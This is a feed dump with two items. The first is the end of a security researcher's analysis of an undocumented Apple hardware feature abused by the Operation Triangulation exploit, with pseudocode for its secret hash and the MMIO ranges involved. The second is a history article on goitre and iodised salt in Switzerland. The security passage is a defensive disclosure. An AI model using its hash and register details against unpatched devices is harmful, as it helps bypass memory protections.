</span><span>0x3A4</span><span>,</span><span> </span><span>0x370</span><span>,</span><span> </span><span>0x3A8</span><span>,</span><span> </span><span>0x3C4</span><span>,</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x160</span><span>,</span><span> </span><span>0x290</span><span>,</span><span> </span><span>0x308</span><span>,</span><span> </span><span>0x3B0</span><span>,</span><span> </span><span>0x3C8</span><span>,</span><span> </span><span>0x3D0</span><span>,</span><span> </span><span>0x1A0</span><span>,</span><span> </span><span>0x260</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x310</span><span>,</span><span> </span><span>0x1C0</span><span>,</span><span> </span><span>0x2A0</span><span>,</span><span> </span><span>0x3E0</span><span>,</span><span> </span><span>0x2C0</span><span>,</span><span> </span><span>0x320</span><span>,</span><span> </span><span>0x340</span><span>,</span><span> </span><span>0x380</span></p><p><span>]</span></p><p><span>def </span><span>calculate_hash</span><span>(</span><span>buffer</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>acc</span><span> </span>=<span> </span><span>0</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>for</span><span> </span><span>i</span><span> </span><span>in</span><span> </span><span>range</span><span>(</span><span>8</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>pos</span><span> </span>=<span> </span><span>i *</span><span> </span><span>4</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>read_dword</span><span>(</span><span>buffer</span><span> </span>+<span> </span><span>pos</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>for</span><span> </span><span>j</span><span> </span><span>in</span><span> </span><span>range</span><span>(</span><span>32</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>(</span><span>(</span><span>value</span><span> </span><span>&gt;</span><span>&gt;</span><span> </span><span>j</span><span>)</span><span> </span>&amp;<span> </span><span>1</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>acc</span><span> </span>^=<span> </span><span>sbox</span><span>[</span><span>32</span><span> </span>*<span> </span><span>i</span><span> </span>+<span> </span><span>j</span><span>]</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> </span><span>acc</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p><em>Pseudocode for the hash function used by this unknown hardware feature</em></p>
<p>As you can see, it is a custom algorithm, and the hash is calculated by using a predefined sbox table. I tried to search for it in a large collection of binaries, but found nothing.</p>
<p>You may notice that this hash does not look very secure, as it occupies just 20 bits (10+10, as it is calculated twice), but it does its job as long as no one knows how to calculate and use it. It is best summarized with the term “<a href="https://encyclopedia.kaspersky.com/glossary/security-by-obscurity-security-through-obscurity/?utm_source=securelist&amp;utm_medium=blog&amp;utm_campaign=termin-explanation" target="_blank" rel="noopener">security by obscurity</a>“.</p>
<p>How could attackers discover and exploit this hardware feature if it is not used and there are no instructions anywhere in the firmware on how to use it?</p>
<p>I ran one more test. I checked and found that the M1 chip inside the Mac also has this unknown hardware feature. Then I used the amazing&nbsp; <a href="https://github.com/AsahiLinux/m1n1" target="_blank" rel="noopener">m1n1</a> tool to conduct an experiment. This tool has a trace_range function, which traces all access to a provided range of MMIO registers. I used it to set up tracing for the memory range 0x206110000–0x206400000, but it reported no usage of these registers by macOS.</p>
<p>Through an amazing coincidence, both my 37C3 presentation and this post discuss a vulnerability very similar to the one I talked about during my presentation at the 36th Chaos Communication Congress (36C3) in 2019.</p>
<p>In the presentation titled, “Hacking Sony PlayStation Blu-ray Drives”, I talked about how I was able to dump firmware and achieve code execution on the Blu-ray drives of Sony PlayStation 3 and 4 by using MMIO DMA registers that were accessible through SCSI commands.</p>
<p><iframe loading="lazy" width="560" height="315" src="https://www.youtube.com/embed/WW39dsbffMw?si=ZOWS4QUC-bWforF9" frameborder="0"></iframe></p>
<p>I was able to discover and exploit this vulnerability, because earlier versions of the firmware used these registers for all DRAM operations, but then Sony stopped using them and started just accessing DRAM directly, because all DRAM was also mapped to the CPU address space. Because no one was using these registers anymore and I knew how to use them, I took advantage of them. It did not need to know any secret hash algorithm.</p>
<p>Could something similar have happened in this case? I do not know that, but this GPU coprocessor first appeared in the recent Apple SoCs. In my personal opinion, based on all the information that I provided above, I highly doubt that this hardware feature was previously used for anything in retail firmware. Nevertheless, there is a possibility that it was previously revealed by mistake in some particular firmware or XNU source code release and then removed.</p>
<p>I was hoping to find out what was located inside the second unknown region from the fix for this vulnerability implemented in iOS 16.6. I was able to find out how Apple mitigated this issue, but they obfuscated the fix.</p>
<p>Apple mitigated this vulnerability by adding the MMIO ranges 0x206000000–0x206050000 and 0x206110000–0x206400000 used by the exploit to the pmap-io-ranges stored in the device tree. XNU uses the information stored there to determine whether to allow mapping of certain physical addresses. All entries stored there have a meaningful tag name that explains what kind of memory the range belongs to.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05.png" alt="" width="393" height="332" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05.png 393w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05-300x253.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130951/trng_final_mystery_en_05-331x280.png 331w" sizes="(max-width: 393px) 100vw, 393px"></a></p>
<p><em>Example of entries stored in the pmap-io-ranges</em></p>
<p>Here, PCIe stands for “Peripheral Component Interconnect Express”, DART stands for “Device Address Resolution Table”, DAPF means “Device Address Filter”, and so on.</p>
<p>And here are the tag names for regions used by the exploit. They stand out from the rest.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130955/trng_final_mystery_en_06.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130955/trng_final_mystery_en_06.png" alt="" width="393" height="46" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130955/trng_final_mystery_en_06.png 393w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130955/trng_final_mystery_en_06-300x35.png 300w" sizes="(max-width: 393px) 100vw, 393px"></a></p>
<p><em>Entries for regions used by the exploit</em></p>
<h2 id="conclusion">Conclusion</h2>
<p>This is no ordinary vulnerability, and we have many unanswered questions. We do not know how the attackers learned to use this unknown hardware feature or what its original purpose was. Neither do we know if it was developed by Apple or it’s a third-party component like ARM CoreSight.</p>
<p>What we do know—and what this vulnerability demonstrates—is that advanced hardware-based protections are useless in the face of a sophisticated attacker as long as there are hardware features that can bypass those protections.</p>
<p>Hardware security very often relies on “security through obscurity”, and it is much more difficult to reverse-engineer than software, but this is a flawed approach, because sooner or later, all secrets are revealed. Systems that rely on “security through obscurity” can never be truly secure.</p>
												</div>
										</div>

										<div>
												
												<ul>
																<li>
			<a href="https://securelist.com/author/borislarin/">
								<img alt="" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/21152203/Boris-Larin_Securelist_2023.jpg" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/21152203/Boris-Larin_Securelist_2023.jpg 2x" height="30" width="30" loading="lazy" decoding="async">										<span>Boris Larin</span></a>
		</li>
														</ul>
											</div>
				<!-- .entry-comments -->
											</div>
									<div>
																				
																					
													
					
					
		<li id="text-22">			<p><a href="https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_kas-ti_acq_ona_smm__onl_b2b_securelist_ban_sm-team______&amp;utm_source=SecureList&amp;utm_medium=sm-project&amp;utm_campaign=gl_kas-ti_le0222&amp;utm_content=banner&amp;utm_term=gl_SecureList_organic_m222khhdtozqgjr" target="_blank" rel="noopener"><img decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/29092442/Threat-Intelligence_banner_310x420_EN.jpg" width="370"></a></p>
		</li>
									</div>
								</div>

						
					</article>
				</div>
			<div>
		<h5>Latest Posts</h5>
		
	</div>
	<div data-element-id="latest-webinars-post-section">
			<h5>Latest Webinars</h5>
			
		</div>
		<div data-element-id="footer-reports-section">
			<h5>Reports</h5>
			<div>
																							<div>
												<article>
		<div>
		
				<p>In this report Kaspersky researchers provide an analysis of the previously unknown HrServ web shell, which exhibits both APT and crimeware features and has likely been active since 2021.</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>Asian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaigns</p>
					</div>
</article>
						</div>
																							<div>
												<article>
		<div>
		
				<p>How Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.</p>
					</div>
</article>
						</div>
															</div>
		</div>
		
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A National Evil – the curse of the goitre in Switzerland (500 pts)]]></title>
            <link>https://www.lrb.co.uk/the-paper/v45/n23/jonah-goodman/a-national-evil</link>
            <guid>38782954</guid>
            <pubDate>Wed, 27 Dec 2023 15:34:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.lrb.co.uk/the-paper/v45/n23/jonah-goodman/a-national-evil">https://www.lrb.co.uk/the-paper/v45/n23/jonah-goodman/a-national-evil</a>, See on <a href="https://news.ycombinator.com/item?id=38782954">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><!--<div class="article-mask"><div class="copyright-restricted-content"><div class="copyright-restricted-content--notice"><p>Please sign in to read the full article.</p><p><a href="/login" title="Login" class="btn btn-primary">Login</a></p></div></div></div>--><p><span>A</span><span>s</span>​ <span>far as</span> the archivist knew, the 48 box files locked in an attic above the Institute for the History of Medicine at the University of Bern had never been opened. They contained a mass of handwritten letters, glass-plate negatives, annotated offprints, minutes of meetings, and piles of press clippings almost too fragile to touch. Gothic newsprint hailed victory over a ‘national evil’. ‘It sounds like a fairy tale,’ the front page of a 1922 copy of <em>Tages-Anzeiger</em> said.</p><p>At the turn of the 20th century, the Swiss were plagued by strange, interlinked medical conditions, which existed elsewhere to a degree, but in Switzerland were endemic in more than 80 per cent of the country. It was a curse that had a mark: the goitre, a bulge of flesh protruding from the front of the neck, sometimes so large that it weighed on the windpipe, giving bearers a characteristic wheeze. It was often disguised by collars and high necklines, but its true extent is laid bare by conscription data. In 1921, nearly 30 per cent of 19-year-old Swiss conscripts had a goitre. In the cantons of Luzern and Obwalden, one in four men were exempt from military service as a result of goitres so large they struggled to breathe. For every man with a goitre, three women suffered from the condition. Children were the most vulnerable of all: in 1921, in the city of Bern, 94 per cent of schoolchildren had some swelling of the neck and almost 70 per cent had a goitre.</p><p>In some parts of the country, one in ten babies was born with what was then known as cretinism. The afflicted grew little more than a metre tall, and had compressed features, thick skin, thin hair and distended bellies. Those with the disease were unable to hear or speak and were profoundly brain-damaged. In 1922, there were at least five thousand people with the condition in Switzerland. Across the country, one person in six hundred was born deaf – a rate five times the international norm. In Zurich and Bern, the most affected cantons, the rate was one in two hundred. Another malaise also affected the Swiss: brain fog – a sense of exhaustion, of hopelessness, of always being cold.</p><p>The burden of these illnesses is hard to overstate. At a time when even young children were expected to help support the family, the birth of a cretin could be a catastrophe. Through it all, there was the fear of what a birth might bring; the fear that it was their fault. This was an ancient evil, noted by Vitruvius and Pliny the Elder. For tourists in the 19th century, the afflicted were one of the sights. ‘On comprend les crétins dont [pullule] la Suisse,’ Victor Hugo wrote from Bern in 1839. ‘Les Alpes font beaucoup d’idiots.’ Mark Twain, in 1880, reported the words of an English traveller: ‘I have seen the principal features of Swiss scenery – Mount Blanc and the goitre – now for home.’</p><div><p><span><img src="https://lrb-website-production-assets.s3.eu-west-2.amazonaws.com/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg" data-appsrc="https://lrb-website-production-assets.s3.eu-west-2.amazonaws.com/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg" data-srcset="https://www.lrb.co.uk/storage/300_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 300w, https://www.lrb.co.uk/storage/400_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 400w, https://www.lrb.co.uk/storage/800_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 800w, https://www.lrb.co.uk/storage/1200_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 1200w, https://www.lrb.co.uk/storage/2000_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 1600w" data-sizes="auto" alt="" data-zoom="true" draggable="false" itemprop="image" srcset="https://www.lrb.co.uk/storage/300_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 300w, https://www.lrb.co.uk/storage/400_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 400w, https://www.lrb.co.uk/storage/800_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 800w, https://www.lrb.co.uk/storage/1200_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 1200w, https://www.lrb.co.uk/storage/2000_filter/images/4/8/4/9/29889484-1-eng-GB/814f8edc5dea-groite-double-portrait_online.jpg 1600w"></span></p><div><p>Thirty-three year old woman with a large goitre. Wespi/Eggenberger collection, Institute for the History of Medicine, Univ. of Bern.</p></div></div><p>Cretinism and goitre were among the great medical mysteries of 19th-century Europe. The overlap of the conditions was a source of fascination, as was their geographical specificity. Scientists, medics and armchair experts flocked to the Alps, seeming to discount nothing in their investigations: landscape, elevation, atmospheric electricity, snow melt, sunlight (too much and too little), ‘miasma’, bad beer, stagnant air, incest and ‘moral failure’. They collected information on the minutiae of life in affected areas, then cross-referenced their reports, following the contemporary medical wisdom which held that all diseases had multiple causes. Did groundwater interact with sunlight to produce goitre? Might a certain combination of air pressure and elevation create a cretin? In 1876, a list of the most promising theories was published; it featured forty different hypotheses.</p><p>In 1883, the scale of the problem became evident when Dr Heinrich Bircher, a lecturer in surgery at the University of Bern, published a survey of goitre in every town and village in Switzerland. Numbers were low in the Jura mountains and in the southern canton of Ticino, but spectacularly high almost everywhere else. In Deisswill, a suburb of the capital, Bern, 94 per cent of young men had large goitres. Villages in the cantons of Zurich and Fribourg reported that one third of inhabitants were deaf. In Kaiseraugst, a short distance up the Rhine from Basel, one person in three was a cretin. Yet the clarity of the data seemed to deepen the mystery: the village of Kaisten was severely affected by the plague, but Effingen, just ten kilometres away, was not.</p><p>As the new science of microbiology began to explain one disease after another, researchers competed to discover a micro-organism for goitre. There were two main theories: a water-borne pathogen and a contagious organism in or around the goitre itself. Meanwhile, theories of ‘racial hygiene’ were gaining ground, with their simple but brutal prescriptions. In <em>Cretinous Degeneracy</em> (1923), the Swiss doctor Ernst Finkbeiner asserted a genetic origin for the disease and offered his solution: ‘To exclude from reproduction anyone even touched by the endemic.’ Parents, siblings, distant cousins.</p><p>From Rudolf Virchow to Alexander von Humboldt, Europe’s greatest scientists had tried to solve the goitre problem. Yet the solution, when it came, did not emerge from a university or research institution, or even a hospital, but from a young doctor called Heinrich Hunziker, a GP in Adliswil, a small town on the western edge of the Zurichsee. Hunziker was also a poet, who wrote short, formally precise verses of yearning and revelation that he published in slim volumes. He was 34 when, in May 1914, he stood up to speak at the Zurichsee Doctors’ Society. Everyone was looking in the wrong place, he said. The cause of the conditions was not a germ or genetic defect, but something missing. Not an agent, but an absence.</p><p><span>T</span><span>ouch</span>​ your neck, just above the base. Beneath the skin, too thin to be felt, is your thyroid, a gland shaped like a butterfly, with wings spread either side of your throat. It produces two hormones that act on almost every cell in your body, influencing nearly all physiological processes: from metabolism to brain function, body temperature to growth. These hormones contain the element iodine. Your body cannot create iodine, so to produce the hormones, you must draw iodine from the world around you: mainly from food, but also from drink and the air you breathe. You only need a tiny amount – an adult requires 150 micrograms a day (fifteen hundredths of a milligram) – but without it, the consequences are dramatic. Your thyroid, desperate for iodine, begins to expand, to filter iodine more effectively from your blood. Over time, this growth becomes a goitre, but even this adaptation may not be enough. Deprived of thyroid hormones, your heart rate slows. You begin to feel cold and exhausted. Your muscles ache and become weak. Soon, your joints begin to swell, your skin dries out, your hair thins. Your voice becomes a rasp. You gain weight, and an all-consuming brain fog settles over you, making it hard to think, to remember things, to feel joy. When children are deprived of these hormones, their growth is damaged. In utero, the effects can be catastrophic. A foetus draws on its mother’s thyroid hormones to grow, and without them, its development is distorted, leading to miscarriage and birth defects, including deafness. In the first trimester of pregnancy, severe iodine deficiency in the mother will cause an embryo to miss crucial stages of development: the child will be born a cretin.</p><p>Iodine can be found almost everywhere in the world. It is abundant in ocean water, and when prehistoric seas receded, the element remained on the land, where it is drawn up by plants, consumed by animals and returned to the soil. This inheritance is kept stable by an ‘iodine cycle’: what is washed out by the rain is replaced by iodine vapour blown far inland. But not in Switzerland. In the last ice age, a permanent ice sheet formed over the Alps. Up to one kilometre thick, its tremendous weight ground against the terrain. It thawed and refroze in stages, and with every thaw, meltwater washed out the rubble. Over the course of 100,000 years, this ice sheet tore the top 250 metres of rock and soil from the surface of the Swiss Central Plateau. At its peak, about 24,000 years ago, it extended across all the northern cantons. It did not reach the Jura or Ticino. In 1964, Dr Franz Merke, a Basel surgeon, showed that the extent of the ice sheet ‘corresponded precisely’ with the prevalence of goitre: Switzerland had been stripped of its iodine. This was a decade after it had finally been proved that iodine deficiency caused the linked medical conditions in the region. Forty years earlier still, in 1914, hormones had only just been defined (in 1905, by Ernest Starling at UCL), nutritional science had barely begun (with Casimir Funk’s 1912 hypothesis on vitamins), and the chemical composition of Swiss soil was unknown. Despite this, almost everything Hunziker argued turned out to be true.</p><p>Iodine was discovered in 1811, and by the time Hunziker gave his speech to the Zurichsee Doctors’ Society, it was used in a bewildering variety of treatments, from cough medicines to skin creams and aphrodisiacs. ‘There was hardly any disease for which it was not recommended,’ Merke wrote in his 1971 book, <em>History and Iconography of Endemic Goitre and Cretinism</em> (first published in English in 1984). But in the 19th century and beyond the element had a grim reputation: it was notorious for inducing the Jod-Basedow effect, a frightening, sometimes fatal condition characterised by bulging eyes, rapid heartbeat, tremor and agitation. Iodine was both famed as a medicine and feared as a poison.</p><p>Hunziker, by contrast, talked about it as a food, an essential part of everyday diet. This was a bewildering leap, and his claims about the amount required were no less startling. Treatments in Swiss pharmacies might contain a daily dose of one gram of iodine, but Hunziker argued that a ten-thousandth of this was all that was required, and that the Jod-Basedow effect (now known as iodine-induced hyperthyroidism, or IIH) was a sign of overdose. Indeed, he claimed to have tested tiny doses for years, with no ill effects: during treatment, goitre shrank; when treatment ceased, it returned. Goitre was not an alien growth or an infection, merely an enlarged thyroid. Hunziker addressed cretinism (now known as congenital iodine deficiency syndrome) with logic: in the rare instances when babies are born without a thyroid, they suffer only after birth, meaning that in utero they must use their mother’s thyroid hormones. Goitre-related birth defects – from deafness to cretinism – must therefore be due to the mother’s lack of iodine, probably in the first trimester. To end the ancestral curse, all the Swiss people needed was a tiny, daily dose of iodine delivered in an everyday commodity: table salt.</p><p>Sodium chloride is the perfect vehicle for iodine. We need a small amount of sodium every day in order to function, and, like iodine, we cannot create it in our bodies. Unlike iodine, sodium is something we crave. Yet our appetite is swiftly sated: people struggle to take the correct dose of pills or tonics, but they consume a remarkably consistent amount of salt. Just as important, iodine in such minute quantities does not change salt’s taste. (Whatever chefs might claim, this fact is well established: in 1995, Unicef, concerned about the sensitivity of children to odd flavours, commissioned a study in which rice was prepared with salt iodised at ten times the maximum recommended concentration. In double-blind taste tests, the iodine was undetectable.)</p><p>In 1915, Hunziker’s speech was published as a 24-page booklet. It was brief and beguilingly simple, but in Switzerland criticism was fierce. Shortly after its publication, a leading doctor at the University of Zurich, Adolf Oswald, wrote a scathing rebuttal in the country’s most authoritative medical journal demanding that the proposal ‘must be vigorously opposed’. To his detractors, Hunziker was historically illiterate and his theory a recipe for mass poisoning. That iodine had some effect on goitre was well known, but it had been thoroughly discredited as cure or prophylaxis – not just once, but numerous times. Similar ideas to Hunziker’s had been in circulation for a century. In 1820, an attempt to treat goitre with iodine by the Geneva doctor Jean-François Coindet left the physician hiding from his furious, overdosed patients. In the 1860s and 1870s, iodised salt experiments conducted in three French départements ended in disaster, with mass outbreaks of Jod-Basedow.</p><p>In 1851, a remarkably similar iodine deficiency theory had been rejected by the French Académie des Sciences. Adolphe Chatin, the young director of the Paris School of Pharmacy presented exhaustive measurements of iodine concentrations in water, soil and vegetables to support his claim that the absence of minute quantities of the element gave rise to goitre. Yet his theory was dismissed: such tiny quantities of a single substance could not, he was told, have such a dramatic impact. The use of iodine as a goitre prophylaxis was proposed again in 1898, 1909 and 1912. In 1911, the US researcher David Marine announced that he had used iodine to prevent goitre in freshwater trout, though he stopped short of endorsing an iodine deficiency theory. He thought the element probably counteracted another, goitre-creating agent, much as quinine acts on the symptoms of malaria. In key respects, notably the quantities of iodine required, Hunziker’s theory really was new, but these subtleties did little to stem the opprobrium.</p><p><span>H</span><span>igh</span>​ in the Alps, Otto Bayard – another country doctor, two years younger than Hunziker – was following the debate. He had studied in Dublin, been to China and Indonesia as a ship’s doctor, and after a Red Cross mission to the Balkans was now, in 1918, back in his native Valais, in a Zermatt emptied of its prewar crowds of tourists, living at the end of a railway line whose two daily steam trains only ran in the summer months. For half the year, it was all but cut off from the world, and visiting a patient could mean a twenty-hour trip on the back of a mule.</p><p>Bayard was sceptical about Hunziker’s theory, but he wanted to know what worked, and knew that, for all the talk, tiny daily doses of iodine had never been put to the test. So he began to devise a new kind of experiment: in an early version of a dose-response trial, he prepared table salt iodised at five different concentrations to give to five families in a goitre area for five months. He worked alone, mixing close to 100 kg of salt with his snow shovel, turning it over until he was sure the potassium iodide was evenly spread. Then, loading up his mule, he set out for Grächen, a remote village even by the standards of upper Valais. It had no train station and no road, and sat on a thin shelf of land, one and half hours by mule from the bottom of the valley. It was badly affected by goitre; 75 per cent of the village schoolchildren had enlarged thyroid glands. Bayard took measurements and photographs, and gave the families iodised salt. He left salt for the cows, to iodise their milk, and for the bakery, so that it would be in the bread. The experiment ran through the winter, the half of the year when children went to school. When Bayard returned in spring, not only had the five families not been poisoned, they all had slimmer necks. He had given the lowest dose – just 4 milligrams of potassium iodide per kilogram of salt – to the family of Theophil Brigger, a farmer who was raising seven children, aged six to fifteen, alone. His children were transformed.</p><p>Bayard broke the news of his solo endeavour just as word reached Switzerland of a successful experiment by David Marine in Akron, Ohio, in which iodine tablets were dispensed to schoolgirls (Marine’s results were published in 1917 in the US, but communication to Europe was disrupted by the war). Bayard set to work on another winter project to prove that the salt would work at scale; not for five families, but for two villages. He chose Grächen again and a village of the same size on the other side of the valley called Törbel. With funding from the Swiss Health Authority, he formalised his operation, preparing highly concentrated batches of iodised salt to be given to one trusted person from each community, along with a small set of scales and precise instructions. At their village salt depots, these representatives painstakingly portioned out three tonnes of salt, a kilogram at a time, and when Bayard returned six months later, the goitres had gone. He continued his experiments in Grächen, adjusting the dose, until, at the end of 1921, he received an invitation to present his results at the new Swiss Goitre Commission in Bern.</p><p><span>T</span><span>here were</span>​ sixteen men at the first commission meeting on 21 January 1922, almost all of them senior figures in Switzerland’s top institutions: the universities, the Federal Health Authorities, the army. Although Hunziker and Bayard were only country doctors, their work was at the top of the agenda. Other possible experiments were discussed, such as intestinal disinfection against imagined goitre microbes, but Bayard’s sensational trials were the focus of attention. The attendees fiercely disagreed about the reason the salt worked, but the evidence that it did seemed irrefutable. How could it be put into practice? Bayard believed that iodised salt should be compulsory; others thought that citizens should choose for themselves whether to use it. Some advocated a clandestine programme, in which iodine would be secretly added to the salt supply, to be revealed only when its positive effects had become evident. There was another complication: in a tradition that went back to the Middle Ages, each of the 25 Swiss cantons held monopoly rights on the sale of salt within its borders. Even if iodisation were to be imposed, it could not be done at federal level: the Swiss people would have to be convinced the salt was safe, canton by canton – a ‘Sisyphean task’, as Bayard later wrote.</p><p>One man at the meeting was sure it could be done. Hans Eggenberger was the chief doctor at the hospital in Herisau, the tiny capital of the sparsely populated canton of Appenzell Ausserrhoden. Unlike Bayard, Eggenberger had no doubts about Hunziker’s theory. The previous May, he had proposed salt iodisation to the canton’s health authority, only to be told, in the recollection of his then assistant, that ‘the people will never, ever permit themselves to accept something like that.’ Then and now, Appenzellers are famed throughout Switzerland for resisting change, but Eggenberger took a different view of his fellow citizens. Returning to Herisau three days after the commission met, he announced an addition to the programme of light entertainment at the town cinema – a lecture on iodised salt. Perhaps it was curiosity, or the colour slides, or the reputation of the charismatic 40-year-old doctor, but the cinema was packed.</p><p>Goitre was embarrassing, ugly and a subject for humour, so Eggenberger began his presentation with the image of the Madonna from Albrecht Dürer’s <em>Dresden Altarpiece</em>: unimpeachable, unmockable and exhibiting, he claimed, an obvious goitre. Speaking in the local Swiss-German dialect, he filled his talk with jokes and tugs on the emotions. He called iodised salt ‘whole salt’, in an echo of ‘whole milk’ and ‘wholemeal’, to make it sound natural and healthy. And he began a petition – a request that the cantonal government ‘take responsibility for the production of whole salt, support it financially and make it accessible to the public wherever salt is sold’. In Switzerland’s system of direct democracy, petitions have weight; in Appenzell Ausserrhoden, as in other cantons, authorities are constitutionally bound to review them and respond without delay. In pursuit of signatures, Eggenberger embarked on a breakneck tour of evening lectures, commandeering an ambulance to visit all fifteen communities in the canton in just three weeks. In five days alone, he gathered more than three thousand signatures. On 20 February, the cantonal government granted permission for production. Two days later, just one month after the Goitre Commission met, ‘whole salt’ went on sale in Appenzell Ausserrhoden. An entire canton had iodised salt: not by diktat, but by popular demand.</p><p>In June, the Goitre Commission met again. Before it lay a report on the history of using iodine to treat goitre by Professor Fritz de Quervain, the country’s leading authority on thyroid disorders. De Quervain was unconvinced by Hunziker’s unproven theory and wary of Eggenberger’s propaganda. His mentor and predecessor at the Bern Inselspital, the Nobel prizewinner Theodor Kocher, had, before his death five years earlier, publicly insisted that goitre prophylaxis should be undertaken only once its mechanism of action was proven. Yet De Quervain’s report set out the case for iodised salt: he was ready to give iodine to an entire country, without understanding how it worked. It was not a calm meeting. There were accusations of poor scientific practice, and allegations of corruption. The men knew they were on the verge of a historic decision, one that might liberate the country, or kill innocent people and destroy trust in the medical profession.</p><p>On 24 June, they formally recommended iodised salt to the cantons. Nothing like this had ever been done before, anywhere in the world: it was the first food fortification programme; the first attempt by a government to improve the lives of an entire population by adding a chemical to its food supply. In November 1922, the first batches were delivered. Within a year, iodised salt was on sale in seventeen cantons. By the end of the decade, it was available nationwide. And so – as in a fairy tale – the ‘national evil’ was banished from the land. By 1930, wherever the salt was used, goitre had all but disappeared. The rate of deaf-mute births fell fivefold in just eight years, from one in six hundred, to one in three thousand. Across the country, schools for deaf-mute children shut down. Since 1930, not a single baby has been born in Switzerland with congenital iodine deficiency syndrome.</p><p>It was a sensation. ‘Switzerland – free of goitre!’ the front page of the <em>Basler Nachrichten</em> announced in February 1922, days after the first Goitre Commission. ‘Unless all the signs prove deceptive, Switzerland today stands at the gates of a goitre-free future.’ The syndicated piece praised Hunziker and Eggenberger ‘as benefactors of humanity and heralds of a new era of healthcare’.</p><p>So why isn’t this story more familiar? Why has the achievement of these pioneers been forgotten, the evidence languishing in a dusty archive? On 20 July 1922, less than a month after the recommendation by the Goitre Commission, an unusually long leading article appeared in the <em>Swiss Medical Weekly</em>. It began: ‘If one looks through medical journals, political dailies, newspapers … one might come to believe that, next to Einstein’s Theory of Relativity, the iodine treatment of goitre is the most important discovery of the last decades, and that … a “goitreless” golden age has arrived.’ What followed was an astonishing attack on the Goitre Commission. Its author, Dr Eugen Bircher, son of Heinrich Bircher and his successor as chief surgeon at the cantonal hospital in Aarau, was a member of the commission, and had voted in favour of iodised salt. Yet now he raged against the ‘downright careless – not to say criminal – praise of iodine’. Insisting without any basis on the risk of the Jod-Basedow effect, Bircher failed to address the success of Bayard’s trial. One explanation for his vitriol is that in 1918, when Bayard began his experiments, Bircher launched Strumaval, an expensive, eight-day goitre treatment, which was still available when his article appeared but whose future seemed unsure.</p><p>Bircher was an influential man in 1920s Switzerland. Tall and domineering, he was a senior figure in the army, and the founder, in 1919, of the Swiss Fatherland Association, a far-right militia with links to the government and fascist groups abroad. He was the subject of scandal in 1924, when he was alleged to have given funding to Hitler in the months of hyperinflation before the Munich Putsch (German intelligence services have a record of a meeting; Swiss intelligence services do not). Hunziker, Bayard and Eggenberger had no attachment to a university or institution, but Bircher became the editor of the <em>Swiss Medical Weekly</em> in 1926. During the 1930s and 1940s, he occupied an ever increasing number of senior positions in the Swiss industrial, political, medical and military establishment. His opposition to iodised salt was fixed and unchanging, long after its effects were 